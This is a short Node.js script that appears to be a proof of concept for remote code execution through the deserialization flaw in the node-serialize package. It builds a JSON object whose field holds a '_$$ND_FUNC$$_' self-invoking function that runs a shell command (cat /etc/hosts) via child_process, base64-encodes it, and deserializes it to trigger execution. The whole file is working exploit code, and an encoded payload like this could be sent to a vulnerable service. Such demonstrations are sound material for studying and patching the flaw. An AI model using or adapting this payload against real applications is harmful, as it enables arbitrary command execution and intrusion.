const serialize = require("node-serialize");

const str = `(async () => { 
  function getExec() {
    return new Promise((resolve) => {
      require("child_process").exec("cat /etc/hosts", function(error, stdout, stderr) { resolve(stdout) });
    })
  }

  const res = await getExec();
  console.log(res)
})()`;

const jsonPayload = {
  name: `_$$ND_FUNC$$_function() { const code = require('child_process').execSync('cat /etc/hosts'); return code.toString(); }()`
}

//console.log(jsonPayload)
const payLoadStringified = JSON.stringify(jsonPayload)
//console.log(payLoadStringified)
const payloadB64 = encodeToBase64(payLoadStringified);
console.log(payloadB64);
let result = unserializePayload(payloadB64);
console.log(result)

function unserializePayload(base64EncodedPayload) {
  const buffer = new Buffer(base64EncodedPayload, 'base64').toString();
  const json = serialize.unserialize(buffer);
  return json;
}

function encodeToBase64(str) {
  return Buffer.from(str).toString('base64');
}